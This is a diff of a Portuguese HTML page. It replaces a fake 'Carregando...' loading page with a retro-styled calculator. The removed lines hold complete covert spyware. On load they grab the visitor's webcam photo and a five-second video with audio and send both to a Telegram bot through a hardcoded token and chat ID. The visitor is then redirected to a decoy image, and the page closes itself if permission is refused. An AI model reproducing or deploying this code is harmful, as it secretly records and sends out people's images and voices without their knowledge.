@@ -1,131 +1,483 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Carregando...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Calculadora Retrô</title>
+
   <style>
-    body {
-      background: #000000;
+    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+    :root {
+      --verde: #9cffb7;
+      --verde-forte: #24ff75;
+      --escuro: #08110d;
+      --painel: rgba(7, 22, 15, 0.9);
+      --borda: rgba(156, 255, 183, 0.42);
+      --vermelho: #ff5570;
+      --amarelo: #ffd85e;
+    }
+
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      overflow: hidden;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: sans-serif;
     }
-    video, canvas { display: none; }
-    .msg-erro { text-align: center; display: none; }
-  </style>
-</head>
-<body>
 
-  <div id="msgErro" class="msg-erro">
-    <h2>Acesso negado.</h2>
-    <p>É necessário permitir o uso da câmera e do microfone para continuar.</p>
-  </div>
+    body {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 20px;
+      overflow-x: hidden;
+      font-family: Arial, sans-serif;
+      background: #090b0a;
+      color: white;
+    }
 
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+    body::before {
+      content: "";
+      position: fixed;
+      inset: -10%;
+      z-index: -3;
+      background:
+        linear-gradient(
+          125deg,
+          rgba(0, 0, 0, 0.76),
+          rgba(7, 42, 25, 0.45),
+          rgba(0, 0, 0, 0.78)
+        ),
+        url("1000624987.jpeg") center / cover no-repeat;
+      filter: blur(2px) saturate(1.25);
+      animation: movimento 18s ease-in-out infinite alternate;
+      transform: scale(1.08);
+    }
 
-  <script>
-    const TELEGRAM_TOKEN = '8387772090:AAEEWGOfpNJy0xT-2GwLQymQptoziAeaAR4';
-    const CHAT_ID = '2003666494';
-    const REDIRECT_URL = 'https://i.ibb.co/ccPKRYw7/Whats-App-Image-2017-05-18-at-11-43-44.jpg';
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      z-index: -2;
+      pointer-events: none;
+      background:
+        radial-gradient(circle at 50% 20%, transparent 0%, rgba(0, 0, 0, .56) 78%),
+        repeating-linear-gradient(
+          to bottom,
+          rgba(255, 255, 255, .035) 0,
+          rgba(255, 255, 255, .035) 1px,
+          transparent 1px,
+          transparent 4px
+        );
+      mix-blend-mode: screen;
+      opacity: .75;
+    }
 
-    async function iniciarNexusApp() {
-      try {
-        // Solicita permissões de Mídia (se o usuário recusar, cai direto no catch)
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
-          audio: true
-        });
-
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-
-        video.onloadedmetadata = () => {
-          // Captura Foto em 1 segundo
-          setTimeout(() => capturarFoto(video), 1000);
-
-          // Inicia Gravação de Vídeo (5 segundos) e redireciona ao terminar com sucesso
-          setTimeout(() => gravarVideoEAudio(stream, 5000), 1200);
-        };
-
-      } catch (err) {
-        console.error("Permissão negada ou erro:", err);
-        
-        // SE NÃO PERMITIR: O site NÃO abre o link. 
-        // Exibe mensagem e tenta fechar a janela/aba (quando permitido pelo navegador)
-        document.getElementById('msgErro').style.display = 'block';
-        
-        try {
-          window.close();
-        } catch(e) {}
-        
-        // Se o navegador bloquear o fechamento automático da aba, redireciona para uma página em branco ou segura
-        setTimeout(() => {
-          window.location.href = "about:blank";
-        }, 1500);
+    @keyframes movimento {
+      0% {
+        transform: scale(1.08) translate3d(-1%, -1%, 0);
+      }
+      100% {
+        transform: scale(1.16) translate3d(1%, 1%, 0);
       }
     }
 
-    // Capturar e Enviar Foto
-    function capturarFoto(video) {
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob((blob) => {
-        if (!blob) return;
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'foto_nexus.jpg');
-        
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-      }, 'image/jpeg', 0.85);
+    .estrelas,
+    .estrelas::before,
+    .estrelas::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      z-index: -1;
+      pointer-events: none;
+      background-image:
+        radial-gradient(circle, rgba(156,255,183,.65) 1px, transparent 1.5px),
+        radial-gradient(circle, rgba(255,255,255,.45) 1px, transparent 1.5px);
+      background-size: 90px 90px, 150px 150px;
+      animation: estrelas 22s linear infinite;
+      opacity: .28;
     }
 
-    // Gravar Vídeo (com Áudio) e Enviar
-    function gravarVideoEAudio(stream, duracao) {
-      let mediaRecorder;
-      try {
-        mediaRecorder = new MediaRecorder(stream);
-      } catch (e) {
+    .estrelas::before {
+      animation-duration: 30s;
+      transform: translateY(-90px);
+      opacity: .2;
+    }
+
+    .estrelas::after {
+      animation-duration: 38s;
+      transform: translateY(100px);
+      opacity: .18;
+    }
+
+    @keyframes estrelas {
+      to {
+        transform: translateY(100px);
+      }
+    }
+
+    .calculadora {
+      width: min(100%, 390px);
+      padding: 18px;
+      border: 1px solid var(--borda);
+      border-radius: 24px;
+      background:
+        linear-gradient(145deg, rgba(30, 75, 49, .35), transparent 45%),
+        var(--painel);
+      box-shadow:
+        0 0 0 1px rgba(0, 0, 0, .7),
+        0 18px 70px rgba(0, 0, 0, .7),
+        0 0 35px rgba(36, 255, 117, .15);
+      backdrop-filter: blur(16px);
+      animation: entrada .8s ease both;
+    }
+
+    @keyframes entrada {
+      from {
+        opacity: 0;
+        transform: translateY(25px) scale(.96);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .topo {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 13px;
+      color: var(--verde);
+      font-family: 'Press Start 2P', monospace;
+      font-size: 8px;
+      letter-spacing: 1px;
+    }
+
+    .luz {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: var(--verde-forte);
+      box-shadow: 0 0 12px var(--verde-forte);
+      animation: piscar 1.4s infinite;
+    }
+
+    @keyframes piscar {
+      50% {
+        opacity: .3;
+        box-shadow: 0 0 3px var(--verde-forte);
+      }
+    }
+
+    .visor {
+      min-height: 108px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      margin-bottom: 17px;
+      padding: 17px 15px;
+      overflow: hidden;
+      border: 2px solid rgba(156,255,183,.35);
+      border-radius: 13px;
+      background: rgba(0, 0, 0, .7);
+      box-shadow:
+        inset 0 0 20px rgba(36,255,117,.08),
+        0 0 18px rgba(36,255,117,.1);
+      color: var(--verde);
+      text-align: right;
+    }
+
+    .historico {
+      min-height: 18px;
+      color: rgba(156,255,183,.56);
+      font-family: 'Press Start 2P', monospace;
+      font-size: 8px;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+      overflow: hidden;
+    }
+
+    .valor {
+      width: 100%;
+      overflow: hidden;
+      font-family: 'Press Start 2P', monospace;
+      font-size: clamp(19px, 7vw, 30px);
+      text-shadow: 0 0 12px rgba(156,255,183,.72);
+      white-space: nowrap;
+      text-overflow: ellipsis;
+    }
+
+    .botoes {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+    }
+
+    button {
+      min-height: 61px;
+      border: 1px solid rgba(156,255,183,.23);
+      border-radius: 12px;
+      background: linear-gradient(145deg, #20372a, #0c1710);
+      color: #f1fff4;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow:
+        inset 0 1px 0 rgba(255,255,255,.09),
+        0 5px 0 #050a07,
+        0 0 10px rgba(36,255,117,.04);
+      transition: .12s ease;
+      user-select: none;
+    }
+
+    button:hover {
+      border-color: var(--verde);
+      color: var(--verde);
+      box-shadow:
+        inset 0 1px 0 rgba(255,255,255,.12),
+        0 5px 0 #050a07,
+        0 0 18px rgba(36,255,117,.3);
+    }
+
+    button:active {
+      transform: translateY(4px);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,.08), 0 1px 0 #050a07;
+    }
+
+    .operador {
+      color: var(--amarelo);
+      background: linear-gradient(145deg, #44391a, #211b0b);
+    }
+
+    .limpar {
+      color: var(--vermelho);
+      background: linear-gradient(145deg, #451c28, #211016);
+    }
+
+    .igual {
+      grid-column: span 2;
+      color: #041009;
+      background: linear-gradient(145deg, #a7ffc0, #28db70);
+      box-shadow:
+        inset 0 1px 0 rgba(255,255,255,.5),
+        0 5px 0 #087a38,
+        0 0 18px rgba(36,255,117,.28);
+    }
+
+    .igual:hover {
+      color: #041009;
+      border-color: white;
+    }
+
+    .zero {
+      grid-column: span 2;
+    }
+
+    .rodape {
+      margin-top: 16px;
+      color: rgba(156,255,183,.42);
+      font-family: 'Press Start 2P', monospace;
+      font-size: 7px;
+      text-align: center;
+      letter-spacing: 1px;
+    }
+
+    @media (max-width: 430px) {
+      body {
+        padding: 12px;
+      }
+
+      .calculadora {
+        padding: 14px;
+        border-radius: 20px;
+      }
+
+      button {
+        min-height: 57px;
+      }
+
+      .botoes {
+        gap: 8px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="estrelas"></div>
+
+  <main class="calculadora">
+    <header class="topo">
+      <span>RETRO CALC 86</span>
+      <i class="luz"></i>
+    </header>
+
+    <section class="visor">
+      <div class="historico" id="historico"></div>
+      <div class="valor" id="valor">0</div>
+    </section>
+
+    <section class="botoes">
+      <button class="limpar" data-acao="limpar">AC</button>
+      <button class="limpar" data-acao="apagar">⌫</button>
+      <button class="operador" data-valor="%">%</button>
+      <button class="operador" data-valor="÷">÷</button>
+
+      <button data-valor="7">7</button>
+      <button data-valor="8">8</button>
+      <button data-valor="9">9</button>
+      <button class="operador" data-valor="×">×</button>
+
+      <button data-valor="4">4</button>
+      <button data-valor="5">5</button>
+      <button data-valor="6">6</button>
+      <button class="operador" data-valor="-">−</button>
+
+      <button data-valor="1">1</button>
+      <button data-valor="2">2</button>
+      <button data-valor="3">3</button>
+      <button class="operador" data-valor="+">+</button>
+
+      <button class="zero" data-valor="0">0</button>
+      <button data-valor=".">.</button>
+      <button class="igual" data-acao="calcular">=</button>
+    </section>
+
+    <footer class="rodape">SISTEMA ONLINE // 1986</footer>
+  </main>
+
+  <script>
+    const valorTela = document.getElementById("valor");
+    const historicoTela = document.getElementById("historico");
+
+    let atual = "0";
+    let anterior = "";
+    let operador = null;
+    let acabouDeCalcular = false;
+
+    function atualizarTela() {
+      valorTela.textContent = atual;
+      historicoTela.textContent =
+        anterior && operador ? `${anterior} ${operador}` : "";
+    }
+
+    function adicionarNumero(numero) {
+      if (acabouDeCalcular) {
+        atual = "0";
+        anterior = "";
+        operador = null;
+        acabouDeCalcular = false;
+      }
+
+      if (atual === "0" && numero !== ".") {
+        atual = numero;
+      } else if (numero === "." && atual.includes(".")) {
+        return;
+      } else {
+        atual += numero;
+      }
+
+      atualizarTela();
+    }
+
+    function escolherOperador(novoOperador) {
+      if (novoOperador === "%") {
+        atual = String(Number(atual) / 100);
+        atualizarTela();
         return;
       }
 
-      let chunks = [];
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+      if (operador && anterior !== "") {
+        calcular();
+      }
 
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/mp4' });
-        
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('video', blob, 'video_nexus.mp4');
-        
-        // Só redireciona para o site correto SE permitir e enviar com sucesso
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd })
-          .finally(() => {
-            window.location.href = REDIRECT_URL;
-          });
-
-        // Encerra a Câmera e Microfone
-        stream.getTracks().forEach(track => track.stop());
-      };
-
-      mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), duracao);
+      anterior = atual;
+      operador = novoOperador;
+      atual = "0";
+      acabouDeCalcular = false;
+      atualizarTela();
     }
 
-    window.addEventListener('DOMContentLoaded', iniciarNexusApp);
+    function calcular() {
+      if (!operador || anterior === "") return;
+
+      const a = Number(anterior);
+      const b = Number(atual);
+      let resultado;
+
+      if (operador === "+") resultado = a + b;
+      if (operador === "-") resultado = a - b;
+      if (operador === "×") resultado = a * b;
+      if (operador === "÷") {
+        if (b === 0) {
+          atual = "Erro";
+          anterior = "";
+          operador = null;
+          atualizarTela();
+          return;
+        }
+        resultado = a / b;
+      }
+
+      historicoTela.textContent = `${a} ${operador} ${b} =`;
+      atual = String(Number(resultado.toFixed(10)));
+      anterior = "";
+      operador = null;
+      acabouDeCalcular = true;
+      atualizarTela();
+    }
+
+    function limpar() {
+      atual = "0";
+      anterior = "";
+      operador = null;
+      acabouDeCalcular = false;
+      atualizarTela();
+    }
+
+    function apagar() {
+      if (atual.length <= 1 || atual === "Erro") {
+        atual = "0";
+      } else {
+        atual = atual.slice(0, -1);
+      }
+      atualizarTela();
+    }
+
+    document.querySelectorAll("button").forEach(botao => {
+      botao.addEventListener("click", () => {
+        const numero = botao.dataset.valor;
+        const acao = botao.dataset.acao;
+
+        if (numero !== undefined) {
+          if ("0123456789.".includes(numero)) {
+            adicionarNumero(numero);
+          } else {
+            escolherOperador(numero);
+          }
+        }
+
+        if (acao === "limpar") limpar();
+        if (acao === "apagar") apagar();
+        if (acao === "calcular") calcular();
+      });
+    });
+
+    document.addEventListener("keydown", evento => {
+      const tecla = evento.key;
+
+      if ("0123456789.".includes(tecla)) adicionarNumero(tecla);
+      if (tecla === "+") escolherOperador("+");
+      if (tecla === "-") escolherOperador("-");
+      if (tecla === "*") escolherOperador("×");
+      if (tecla === "/") escolherOperador("÷");
+      if (tecla === "%") escolherOperador("%");
+      if (tecla === "Enter" || tecla === "=") calcular();
+      if (tecla === "Escape") limpar();
+      if (tecla === "Backspace") apagar();
+    });
+
+    atualizarTela();
   </script>
 </body>
 </html>
